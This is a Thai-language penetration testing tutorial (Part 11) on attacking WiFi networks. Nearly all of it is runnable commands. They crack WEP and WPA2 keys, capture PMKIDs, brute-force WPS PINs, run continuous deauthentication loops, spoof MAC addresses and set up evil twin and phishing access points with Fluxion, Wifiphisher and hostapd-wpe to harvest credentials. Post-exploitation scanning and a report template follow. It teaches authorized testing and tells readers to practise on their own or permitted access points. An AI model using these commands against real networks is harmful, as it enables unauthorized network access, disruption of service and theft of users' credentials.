# Part 11: Wireless Network Security (Steps 101-110)

## บทนำ

Wireless Security คือหนึ่งในสาขาที่น่าตื่นเต้นที่สุดใน Penetration Testing เพราะสามารถโจมตีได้จากระยะไกลโดยไม่ต้องเชื่อมต่อสาย ในบทนี้จะเรียนรู้การโจมตี WiFi ทุกรูปแบบตั้งแต่ WEP, WPA/WPA2, WPS ไปจนถึง Advanced Attacks

---

## Step 101: Wireless Fundamentals

### ทำความเข้าใจ 802.11 Standards

```
802.11 WiFi Standards:
- 802.11a  - 5GHz, 54Mbps (1999)
- 802.11b  - 2.4GHz, 11Mbps (1999)
- 802.11g  - 2.4GHz, 54Mbps (2003)
- 802.11n  - 2.4/5GHz, 600Mbps (2009) = WiFi 4
- 802.11ac - 5GHz, 1.3Gbps (2013) = WiFi 5
- 802.11ax - 2.4/5/6GHz, 9.6Gbps (2019) = WiFi 6

Security Protocols:
- WEP  - Wired Equivalent Privacy (BROKEN - ไม่ใช้แล้ว)
- WPA  - WiFi Protected Access (อ่อนแอ)
- WPA2 - WiFi Protected Access 2 (มาตรฐาน)
- WPA3 - WiFi Protected Access 3 (ใหม่ล่าสุด)

Authentication:
- Personal (PSK) - Pre-Shared Key
- Enterprise (802.1X) - RADIUS Server
```

### การตั้งค่า Wireless Card สำหรับ Hacking

```bash
# ตรวจสอบ Wireless Cards ที่รองรับ Monitor Mode
# Cards ยอดนิยมสำหรับ WiFi Hacking:
# - Alfa AWUS036ACH (802.11ac, 1.2W)
# - Alfa AWUS036NHA (802.11n, 2.4GHz)
# - TP-Link TL-WN722N v1 (ต้องเป็น v1 เท่านั้น!)
# - Panda PAU09 (Dual band)

# ดู Wireless Interfaces
iwconfig
iw dev
ip link show

# ดูรายการ WiFi cards
lsusb | grep -i wireless
lspci | grep -i network
lspci | grep -i wireless

# ตรวจสอบว่า Card รองรับ Monitor Mode หรือไม่
iw list | grep -A 10 "Supported interface modes"
iw phy0 info | grep -A 10 "Supported interface modes"

# ดู Channels ที่รองรับ
iw phy0 channels
```

### การเปิด Monitor Mode

```bash
# วิธีที่ 1: ใช้ airmon-ng (แนะนำ)
sudo apt install aircrack-ng

# ดู wireless interfaces
sudo airmon-ng

# หยุด processes ที่อาจรบกวน
sudo airmon-ng check kill

# เปิด Monitor Mode
sudo airmon-ng start wlan0

# ตรวจสอบ (interface ชื่อจะเปลี่ยนเป็น wlan0mon)
iwconfig wlan0mon
iw dev

# ปิด Monitor Mode
sudo airmon-ng stop wlan0mon

# วิธีที่ 2: ด้วย iw
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up
iwconfig wlan0   # ควรแสดง Mode:Monitor

# วิธีที่ 3: ด้วย iwconfig
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up

# เปลี่ยน Channel
sudo iwconfig wlan0mon channel 6
sudo iw dev wlan0mon set channel 6
```

---

## Step 102: WiFi Reconnaissance

### การสแกน WiFi Networks

```bash
# ==========================================
# airodump-ng - Network Discovery
# ==========================================

# สแกนทุก channels (2.4GHz)
sudo airodump-ng wlan0mon

# สแกนเฉพาะ 5GHz
sudo airodump-ng wlan0mon --band a

# สแกนทั้ง 2.4GHz และ 5GHz
sudo airodump-ng wlan0mon --band abg

# สแกนเฉพาะ channel
sudo airodump-ng wlan0mon -c 6

# บันทึกผล
sudo airodump-ng wlan0mon -w scan_output --output-format csv,pcap

# ==========================================
# Column Headers ใน airodump-ng:
# ==========================================
# BSSID    - MAC address ของ AP
# PWR      - Signal strength (ยิ่งใกล้ 0 ยิ่งแรง)
# Beacons  - จำนวน beacon frames
# #Data    - จำนวน data packets
# #/s      - packets ต่อวินาที
# CH       - Channel
# MB       - Max speed
# ENC      - Encryption (OPN/WEP/WPA/WPA2/WPA3)
# CIPHER   - Cipher (TKIP/CCMP)
# AUTH     - Authentication (PSK/MGT)
# ESSID    - Network Name

# ==========================================
# Focused Scan
# ==========================================

# สแกนเฉพาะ BSSID เป้าหมาย
sudo airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w target_capture

# ==========================================
# เครื่องมืออื่น
# ==========================================

# iwlist scan - ง่ายกว่า แต่ไม่ละเอียด
sudo iwlist wlan0 scan
sudo iwlist wlan0 scan | grep -E "ESSID|Address|Quality|Encryption"

# nmcli - NetworkManager CLI
nmcli dev wifi list

# wash - สแกน WPS networks
sudo wash -i wlan0mon

# ==========================================
# Kismet - Advanced Wireless Scanner
# ==========================================
sudo apt install kismet

sudo kismet -c wlan0
# เข้า Web Interface: http://localhost:2501
# Username: kismet
# Password: kismet (เปลี่ยนหลังติดตั้ง)
```

---

## Step 103: WEP Cracking

### WEP (Wired Equivalent Privacy) - BROKEN

```bash
# ==========================================
# WEP Attack - Aircrack-ng Suite
# ==========================================

# WEP ถูก crack ได้ใน 5-10 นาที
# เพราะใช้ RC4 กับ IV ที่ซ้ำกัน

# ขั้นตอน:
# 1. เปิด Monitor Mode
# 2. Capture WEP traffic
# 3. Inject packets เพื่อเพิ่ม traffic
# 4. Crack key

# ==========================================
# Step 1: เปิด Monitor Mode
# ==========================================
sudo airmon-ng start wlan0

# ==========================================
# Step 2: สแกน WEP Networks
# ==========================================
sudo airodump-ng wlan0mon
# หา network ที่ใช้ ENC: WEP

# ==========================================
# Step 3: Capture WEP Traffic
# ==========================================
sudo airodump-ng -c 6 \
    --bssid AA:BB:CC:DD:EE:FF \
    -w wep_capture \
    wlan0mon

# ==========================================
# Step 4: Associate กับ AP (Fake Authentication)
# ==========================================
sudo aireplay-ng -1 0 \
    -a AA:BB:CC:DD:EE:FF \
    -h 11:22:33:44:55:66 \
    wlan0mon

# ==========================================
# Step 5: ARP Replay Attack (เพิ่ม IVs)
# ==========================================
sudo aireplay-ng -3 \
    -b AA:BB:CC:DD:EE:FF \
    -h 11:22:33:44:55:66 \
    wlan0mon

# รอให้ได้ IVs อย่างน้อย 50,000-100,000
# ดูจาก #Data ใน airodump-ng

# ==========================================
# Step 6: Crack WEP Key
# ==========================================
aircrack-ng wep_capture-01.cap

# ถ้า IVs ยังไม่พอ
aircrack-ng -n 64 wep_capture-01.cap   # 64-bit key
aircrack-ng -n 128 wep_capture-01.cap  # 128-bit key

# ==========================================
# Fragmentation Attack (ถ้า ARP replay ไม่ได้ผล)
# ==========================================
sudo aireplay-ng -5 \
    -b AA:BB:CC:DD:EE:FF \
    -h 11:22:33:44:55:66 \
    wlan0mon

# สร้าง ARP packet ด้วย packetforge-ng
packetforge-ng -0 \
    -a AA:BB:CC:DD:EE:FF \
    -h 11:22:33:44:55:66 \
    -k 255.255.255.255 \
    -l 255.255.255.255 \
    -y fragment.xor \
    -w arp-request.cap

# Inject packet
sudo aireplay-ng -2 -r arp-request.cap wlan0mon
```

---

## Step 104: WPA/WPA2 Handshake Capture

### WPA2 PSK Attack

```bash
# ==========================================
# WPA2 Attack Overview
# ==========================================

# WPA2-PSK ถูก crack ด้วย:
# 1. Capture 4-way handshake
# 2. Dictionary/Brute force attack บน handshake

# ==========================================
# Step 1: สแกนหา WPA2 Network
# ==========================================
sudo airodump-ng wlan0mon

# หา network ที่ต้องการ:
# ENC: WPA2, AUTH: PSK

# ==========================================
# Step 2: Capture Handshake
# ==========================================

# Terminal 1: เริ่ม capture
sudo airodump-ng -c 6 \
    --bssid AA:BB:CC:DD:EE:FF \
    -w handshake_capture \
    wlan0mon

# Terminal 2: Deauth clients (เพื่อให้ reconnect)
sudo aireplay-ng -0 10 \
    -a AA:BB:CC:DD:EE:FF \
    wlan0mon

# หรือ deauth client เฉพาะราย
sudo aireplay-ng -0 10 \
    -a AA:BB:CC:DD:EE:FF \
    -c CC:DD:EE:FF:00:11 \
    wlan0mon

# รอ handshake (จะแสดงที่ upper-right corner ใน airodump-ng)
# "WPA handshake: AA:BB:CC:DD:EE:FF"

# ==========================================
# ตรวจสอบ Handshake
# ==========================================

# ด้วย aircrack-ng
aircrack-ng handshake_capture-01.cap

# ด้วย pyrit
pyrit -r handshake_capture-01.cap analyze

# ด้วย cowpatty
cowpatty -r handshake_capture-01.cap -s "NetworkName" -f /dev/null

# ==========================================
# Step 3: Crack WPA2 Password
# ==========================================

# Dictionary Attack ด้วย aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake_capture-01.cap

# ระบุ BSSID
aircrack-ng -w /usr/share/wordlists/rockyou.txt \
    -b AA:BB:CC:DD:EE:FF \
    handshake_capture-01.cap

# ด้วย hashcat (เร็วกว่ามาก)
# แปลง cap เป็น hccapx
cap2hccapx handshake_capture-01.cap handshake.hccapx
# หรือใช้ hcxpcapngtool
hcxpcapngtool -o handshake.hc22000 handshake_capture-01.cap

# crack ด้วย hashcat
hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt

# Dictionary + Rules
hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute Force (ช้า แต่ full coverage)
hashcat -m 22000 handshake.hc22000 -a 3 ?l?l?l?l?l?l?l?l

# Mask Attack
hashcat -m 22000 handshake.hc22000 -a 3 ?d?d?d?d?d?d?d?d  # 8 digits
hashcat -m 22000 handshake.hc22000 -a 3 ?u?l?l?l?d?d?d     # Uppercase + lower + 3 digits
```

---

## Step 105: PMKID Attack (ไม่ต้องรอ Client!)

### PMKID Attack - ทันสมัยที่สุด

```bash
# ==========================================
# PMKID Attack - 2018 Technique by Jens Steube
# ==========================================

# ข้อดี: ไม่ต้องรอ Client ต่อ!
# ต้องการแค่ AP (Access Point) เท่านั้น

# ==========================================
# Method 1: hcxdumptool + hcxtools
# ==========================================

sudo apt install hcxdumptool hcxtools

# Capture PMKID
sudo hcxdumptool -i wlan0mon \
    --enable_status=3 \
    -o pmkid_capture.pcapng

# หรือ target เฉพาะ BSSID
sudo hcxdumptool -i wlan0mon \
    --filterlist_ap=targets.txt \
    --filtermode=2 \
    --enable_status=3 \
    -o pmkid_capture.pcapng

# ดู progress
hcxdumptool -i wlan0mon --enable_status=3 | grep PMKID

# แปลงเป็น format ที่ hashcat ใช้
hcxpcapngtool -o hash.hc22000 pmkid_capture.pcapng

# Crack
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# ==========================================
# Method 2: ด้วย Besside-ng (simpler)
# ==========================================

# Capture WPA traffic อัตโนมัติ
sudo besside-ng -c 6 -b AA:BB:CC:DD:EE:FF wlan0mon

# ==========================================
# wifite - Automated Tool
# ==========================================

sudo apt install wifite

sudo wifite                          # โจมตีทุก networks
sudo wifite --wpa --pmkid            # เฉพาะ PMKID
sudo wifite -e "NetworkName"         # เฉพาะ ESSID
sudo wifite --mac                    # เปลี่ยน MAC ก่อน
```

---

## Step 106: WPS Attacks

### WPS (WiFi Protected Setup) Attacks

```bash
# ==========================================
# WPS - Vulnerable Protocol
# ==========================================

# WPS มี 2 vulnerabilities:
# 1. Pixie Dust Attack (offline attack) - เร็วมาก
# 2. Online Brute Force (WPS PIN) - ช้า แต่ได้ผล

# ==========================================
# เครื่องมือ
# ==========================================

# Reaver - WPS Brute Force
sudo apt install reaver

# Bully - Alternative to Reaver
sudo apt install bully

# ==========================================
# ค้นหา WPS Networks
# ==========================================

# wash - สแกน WPS networks
sudo wash -i wlan0mon
sudo wash -i wlan0mon -c 6          # เฉพาะ channel

# Output:
# BSSID              Ch  dBm  WPS  Lck  Vendor    ESSID
# AA:BB:CC:DD:EE:FF   6  -45  2.0  No   Netgear   HomeNetwork

# WPS: เวอร์ชัน WPS
# Lck: Locked (Yes = WPS ถูก lock แล้ว ยาก)

# ==========================================
# Pixie Dust Attack (เร็วมาก - วินาที-นาที)
# ==========================================

# ด้วย reaver
sudo reaver -i wlan0mon \
    -b AA:BB:CC:DD:EE:FF \
    -K 1 \
    -vvv

# ด้วย pixiewps
pixiewps -e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> -a <Authkey> -n <E-Nonce>

# ด้วย OneShot (Python - ดีที่สุด)
git clone https://github.com/drygdryg/OneShot.git
cd OneShot
sudo python3 oneshot.py -i wlan0mon -b AA:BB:CC:DD:EE:FF -K

# ==========================================
# WPS PIN Brute Force (ช้า - ชั่วโมง)
# ==========================================

# reaver
sudo reaver -i wlan0mon \
    -b AA:BB:CC:DD:EE:FF \
    -vvv \
    -d 1 \
    -r 3:15

# Options:
# -d 1     = delay 1 second
# -r 3:15  = retry 3 times per 15 seconds (ป้องกัน lock)
# --no-nacks = ไม่ส่ง NACKs
# -L       = ignore WPS Lock

# bully
sudo bully -b AA:BB:CC:DD:EE:FF \
    -c 6 \
    -d \
    -v 3 \
    wlan0mon

# ==========================================
# เมื่อได้ WPS PIN หรือ Password
# ==========================================

# WPA Password จะแสดงเมื่อ crack สำเร็จ:
# [+] WPS PIN: '12345670'
# [+] WPA PSK: 'MyPassword123'
# [+] AP SSID: 'HomeNetwork'
```

---

## Step 107: Evil Twin / Rogue AP Attack

### Evil Twin Attack

```bash
# ==========================================
# Evil Twin Attack Overview
# ==========================================

# หลักการ:
# 1. สร้าง AP ปลอมที่ชื่อเดียวกับ AP จริง
# 2. Deauth clients ออกจาก AP จริง
# 3. Clients จะ connect มาที่ AP ปลอม
# 4. ดักจับ credentials/traffic

# ==========================================
# hostapd-wpe - WPA Enterprise Attack
# ==========================================

sudo apt install hostapd-wpe

# config file สำหรับ Enterprise
cat > /tmp/hostapd-wpe.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=CorporateWiFi
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
ieee8021x=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
EOF

sudo hostapd-wpe /tmp/hostapd-wpe.conf

# Credentials จะถูก log:
# wpe_log: u=username
# wpe_log: nt=NTHash

# ==========================================
# airbase-ng - Simple Fake AP
# ==========================================

# สร้าง Open AP
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# สร้าง WPA2 AP
sudo airbase-ng -e "TargetNetwork" -c 6 -z 4 wlan0mon

# ==========================================
# hostapd + dnsmasq + iptables (Full Setup)
# ==========================================

# ติดตั้ง
sudo apt install hostapd dnsmasq

# 1. สร้าง hostapd.conf
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=FreeWiFi
channel=6
hw_mode=g
ignore_broadcast_ssid=0
EOF

# 2. ตั้งค่า IP สำหรับ AP interface
sudo ip addr add 10.0.0.1/24 dev wlan0

# 3. ตั้งค่า dnsmasq (DHCP + DNS)
cat > /tmp/dnsmasq.conf << 'EOF'
interface=wlan0
dhcp-range=10.0.0.2,10.0.0.100,255.255.255.0,24h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
log-queries
log-dhcp
EOF

# 4. เปิด IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# 5. ตั้งค่า NAT (ให้ client เข้า internet)
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT

# 6. เริ่ม services
sudo hostapd /tmp/hostapd.conf &
sudo dnsmasq -C /tmp/dnsmasq.conf &

# 7. Deauth clients จาก AP จริง
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon &

# ==========================================
# Fluxion - Automated Evil Twin
# ==========================================

git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion
sudo bash fluxion.sh

# Fluxion ทำทุกอย่างอัตโนมัติ:
# - สแกน networks
# - สร้าง Evil Twin
# - Capture handshake
# - หลอกให้ user ใส่ password
# - ตรวจสอบ password ด้วย handshake

# ==========================================
# Wifiphisher - Automated Phishing
# ==========================================

sudo apt install wifiphisher
sudo wifiphisher

# Templates ที่ใช้:
# - firmware-upgrade (หน้า upgrade)
# - oauth-login (Google/Facebook login)
# - wifi_connect (WiFi password)
# - browser_plugin_update
```

---

## Step 108: Advanced WiFi Attacks

### KARMA Attack และ Probe Request Attack

```bash
# ==========================================
# KARMA Attack
# ==========================================

# KARMA: Respond ทุก Probe Request
# เหมาะสำหรับ Public places

# ด้วย hostapd-karma
sudo apt install hostapd-karma

# config
cat > /tmp/karma.conf << 'EOF'
interface=wlan0
ssid=freewifi
channel=6
karma=1
EOF

sudo hostapd-karma /tmp/karma.conf

# ==========================================
# Probe Request Sniffing
# ==========================================

# ดักจับ Probe Requests (networks ที่ client เคยต่อ)
sudo airodump-ng wlan0mon 2>/dev/null | grep "Probe"

# ด้วย Python/Scapy
python3 << 'EOF'
from scapy.all import *

def probe_handler(pkt):
    if pkt.haslayer(Dot11ProbeReq):
        if pkt.info:
            ssid = pkt.info.decode('utf-8', errors='ignore')
            mac = pkt.addr2
            print(f"[*] Client {mac} looking for: {ssid}")

print("[*] Sniffing Probe Requests...")
sniff(iface="wlan0mon", prn=probe_handler, store=False)
EOF

# ==========================================
# Deauthentication Attack
# ==========================================

# Deauth เฉพาะ client
sudo aireplay-ng -0 1 \
    -a AA:BB:CC:DD:EE:FF \
    -c CC:DD:EE:FF:00:11 \
    wlan0mon

# Deauth ทุก clients (broadcast)
sudo aireplay-ng -0 0 \
    -a AA:BB:CC:DD:EE:FF \
    wlan0mon

# Continuous deauth
while true; do
    sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
    sleep 1
done

# ==========================================
# MAC Address Spoofing
# ==========================================

# เปลี่ยน MAC ก่อนโจมตีเสมอ
sudo ip link set wlan0 down
sudo ip link set wlan0 address AA:BB:CC:DD:EE:FF
sudo ip link set wlan0 up

# หรือใช้ macchanger
sudo apt install macchanger
sudo macchanger -r wlan0           # Random MAC
sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0  # เฉพาะ
sudo macchanger -s wlan0           # ดู MAC ปัจจุบัน

# ==========================================
# WPA3 Attacks (Dragonblood)
# ==========================================

# WPA3 SAE (Simultaneous Authentication of Equals)
# มีช่องโหว่ Dragonblood (2019):
# CVE-2019-9494 - Cache-based side-channel
# CVE-2019-9496 - Invalid curve attack

# ทดสอบด้วย dragonblood tools
git clone https://github.com/vanhoefm/dragonblood.git
cd dragonblood
```

---

## Step 109: WiFi Traffic Analysis

### การวิเคราะห์ WiFi Traffic

```bash
# ==========================================
# Wireshark WiFi Filters
# ==========================================

# ดู WiFi frames ทั้งหมด
wlan

# เฉพาะ Management frames
wlan.fc.type == 0

# เฉพาะ Control frames
wlan.fc.type == 1

# เฉพาะ Data frames
wlan.fc.type == 2

# Beacon frames
wlan.fc.type_subtype == 8

# Probe Request
wlan.fc.type_subtype == 4

# Probe Response
wlan.fc.type_subtype == 5

# Authentication
wlan.fc.type_subtype == 11

# Deauthentication
wlan.fc.type_subtype == 12

# Association Request
wlan.fc.type_subtype == 0

# 4-way Handshake
eapol

# WPS
wps

# ==========================================
# tcpdump สำหรับ WiFi
# ==========================================

# Capture WiFi traffic
sudo tcpdump -i wlan0mon -w wifi_capture.pcap

# ดู Probe Requests
sudo tcpdump -i wlan0mon -e 'wlan[0] == 0x40'

# ดู Deauth frames
sudo tcpdump -i wlan0mon -e 'wlan[0] == 0xc0'

# ==========================================
# แตกไฟล์ที่ถ่ายโอนผ่าน WiFi
# ==========================================

# ด้วย Wireshark: File > Export Objects > HTTP

# ด้วย tcpxtract
sudo apt install tcpxtract
tcpxtract -f wifi_capture.pcap -o extracted_files/

# ด้วย networkminer (Windows/Wine)
# เปิดไฟล์ pcap แล้วดู Files tab

# ==========================================
# Decrypt WPA2 traffic ใน Wireshark
# ==========================================

# ต้องมี:
# 1. Handshake ใน pcap
# 2. WPA2 Password

# Wireshark > Edit > Preferences > Protocols > IEEE 802.11
# Enable decryption: Yes
# Decryption keys > Edit > Add
# Type: wpa-pwd
# Key: PASSWORD:SSID

# ==========================================
# bettercap สำหรับ WiFi
# ==========================================

sudo apt install bettercap

sudo bettercap -iface wlan0mon

# Commands:
bettercap > wifi.recon on
bettercap > wifi.show
bettercap > wifi.deauth AA:BB:CC:DD:EE:FF
bettercap > wifi.assoc AA:BB:CC:DD:EE:FF
bettercap > help wifi
```

---

## Step 110: WiFi Penetration Testing Report

### Wireless Pentest Methodology

```bash
# ==========================================
# WiFi Pentest Checklist
# ==========================================

# Pre-Engagement
echo "=== WiFi Pentest Scope ==="
echo "1. รายชื่อ SSIDs ที่ได้รับอนุญาต"
echo "2. เวลาที่อนุญาต"
echo "3. Physical access?"
echo "4. WPA Enterprise credentials?"

# ==========================================
# Phase 1: Discovery
# ==========================================

# สแกนทุก networks ในพื้นที่
sudo airodump-ng wlan0mon -w discovery_scan
sleep 60 && killall airodump-ng

# Parse ผลลัพธ์
cat discovery_scan-01.csv | grep -v "^Station" | head -50

# ==========================================
# Phase 2: Target Selection
# ==========================================

# กำหนด targets
TARGET_SSID="TargetNetwork"
TARGET_BSSID="AA:BB:CC:DD:EE:FF"
TARGET_CHANNEL=6

echo "Target: $TARGET_SSID ($TARGET_BSSID) on CH$TARGET_CHANNEL"

# ==========================================
# Phase 3: Attack Execution
# ==========================================

# สร้าง directory สำหรับ output
mkdir -p ~/wifi_pentest/{captures,cracked,reports}

# Capture handshake
sudo airodump-ng wlan0mon \
    -c $TARGET_CHANNEL \
    --bssid $TARGET_BSSID \
    -w ~/wifi_pentest/captures/target &

sleep 5

# Deauth
sudo aireplay-ng -0 10 \
    -a $TARGET_BSSID \
    wlan0mon

# ==========================================
# Phase 4: Cracking
# ==========================================

# ตรวจสอบ handshake
aircrack-ng ~/wifi_pentest/captures/target-01.cap

# Crack ด้วย custom wordlist
cat > /tmp/wifi_wordlist.txt << 'EOF'
password
12345678
password123
admin123
wifi12345
welcome1
company2024
EOF

aircrack-ng -w /tmp/wifi_wordlist.txt \
    ~/wifi_pentest/captures/target-01.cap

# Crack ด้วย hashcat (GPU)
hcxpcapngtool -o ~/wifi_pentest/captures/target.hc22000 \
    ~/wifi_pentest/captures/target-01.cap

hashcat -m 22000 \
    ~/wifi_pentest/captures/target.hc22000 \
    /usr/share/wordlists/rockyou.txt \
    --status \
    -o ~/wifi_pentest/cracked/results.txt

# ==========================================
# Phase 5: Post-Exploitation
# ==========================================

# เมื่อได้ password แล้ว:
# 1. เชื่อมต่อ WiFi
nmcli dev wifi connect "$TARGET_SSID" password "CRACKED_PASSWORD"

# 2. Scan network
nmap -sn 192.168.1.0/24

# 3. ค้นหา services
nmap -sV -T4 192.168.1.0/24

# ==========================================
# Phase 6: Reporting
# ==========================================

cat > ~/wifi_pentest/reports/findings.md << 'EOF'
# WiFi Penetration Test Report

## Executive Summary
พบช่องโหว่ด้านความปลอดภัยใน Wireless Network

## Findings

### Finding 1: WPA2-PSK Weak Password
**Severity**: High
**SSID**: TargetNetwork
**BSSID**: AA:BB:CC:DD:EE:FF

**Description**: 
Network ใช้ WPA2-PSK ที่มี password ง่าย สามารถ crack ได้ใน <30 นาที

**Evidence**:
- Captured WPA2 handshake
- Password cracked: xxxxxx

**Remediation**:
1. เปลี่ยน WiFi password เป็น passphrase ยาวอย่างน้อย 20 characters
2. ใช้ตัวอักษรหลากหลาย (upper, lower, numbers, special)
3. พิจารณาเปลี่ยนเป็น WPA3 ถ้า hardware รองรับ
4. ใช้ WPA2-Enterprise สำหรับ corporate network

### Finding 2: WPS Enabled
**Severity**: Medium  
**Description**: WPS ยังเปิดใช้งาน อาจถูกโจมตีด้วย Pixie Dust

**Remediation**:
1. ปิด WPS ใน Router settings
EOF

echo "Report generated: ~/wifi_pentest/reports/findings.md"

# ==========================================
# Automated WiFi Audit Script
# ==========================================

#!/bin/bash
# wifi_audit.sh - Quick WiFi Security Audit

INTERFACE="wlan0mon"
SCAN_TIME=60
OUTPUT_DIR="./wifi_audit_$(date +%Y%m%d_%H%M%S)"

mkdir -p "$OUTPUT_DIR"

echo "=== Starting WiFi Security Audit ==="
echo "Interface: $INTERFACE"
echo "Scan Duration: ${SCAN_TIME}s"
echo ""

# 1. Start capture
sudo airodump-ng "$INTERFACE" \
    -w "$OUTPUT_DIR/discovery" \
    --output-format csv &
AIRODUMP_PID=$!

sleep $SCAN_TIME
kill $AIRODUMP_PID 2>/dev/null

# 2. Parse results
echo "=== Networks Found ==="
awk -F, 'NR>2 && $1!="" && $1!="Station MAC" {
    gsub(/^ | $/, "", $1)  # BSSID
    gsub(/^ | $/, "", $4)  # Channel
    gsub(/^ | $/, "", $6)  # ENC
    gsub(/^ | $/, "", $14) # ESSID
    printf "%-20s CH:%-3s ENC:%-5s SSID: %s\n", $1, $4, $6, $14
}' "$OUTPUT_DIR/discovery-01.csv" | sort -t: -k2 -n

# 3. Check for WPS
echo ""
echo "=== WPS Networks ==="
sudo wash -i "$INTERFACE" -s 2>/dev/null | head -20

echo ""
echo "Audit complete. Results in: $OUTPUT_DIR"
```

---

## สรุป Part 11

ในบทนี้คุณได้เรียนรู้:

✅ **Step 101**: Wireless Fundamentals และการตั้งค่า Monitor Mode  
✅ **Step 102**: WiFi Reconnaissance ด้วย airodump-ng  
✅ **Step 103**: WEP Cracking  
✅ **Step 104**: WPA2 Handshake Capture และ Cracking  
✅ **Step 105**: PMKID Attack (ไม่ต้องรอ Client!)  
✅ **Step 106**: WPS Attacks (Pixie Dust & PIN Brute Force)  
✅ **Step 107**: Evil Twin / Rogue AP Attack  
✅ **Step 108**: Advanced WiFi Attacks (KARMA, Deauth, WPA3)  
✅ **Step 109**: WiFi Traffic Analysis  
✅ **Step 110**: WiFi Penetration Testing Report  

## เครื่องมือที่ใช้

| เครื่องมือ | ใช้สำหรับ |
|-----------|-----------|
| aircrack-ng suite | WEP/WPA cracking, capture |
| hashcat | GPU-accelerated password cracking |
| reaver/bully | WPS attacks |
| hostapd | Evil Twin AP |
| wifite | Automated WiFi attacks |
| fluxion | Social engineering WiFi attack |
| bettercap | Network analysis |
| hcxtools | PMKID capture/conversion |

## แบบฝึกหัด

1. ตั้งค่า Lab ด้วย 2 VMs และ AP จำลอง
2. ทดสอบ WPA2 handshake capture กับ AP ของตัวเอง
3. ทดสอบ PMKID attack กับ AP ที่ได้รับอนุญาต
4. สร้าง Evil Twin AP ใน isolated lab
5. วิเคราะห์ WiFi traffic ด้วย Wireshark

## ถัดไป: Part 12 - Active Directory Attacks

---

*Part 11 | Steps 101-110 | ระดับ: กลาง-สูง*
